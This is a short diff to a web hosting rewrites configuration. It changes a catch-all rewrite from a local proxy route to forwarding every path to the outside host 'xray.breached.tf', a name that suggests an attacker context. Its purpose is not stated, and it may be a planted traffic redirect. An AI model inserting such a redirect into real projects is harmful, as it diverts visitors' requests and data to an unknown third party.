@@ -1,5 +1,5 @@
 {
   "rewrites": [
-    { "source": "/(.*)", "destination": "/api/proxy" }
+    { "source": "/:path*", "destination": "https://xray.breached.tf/:path*" }
   ]
 }
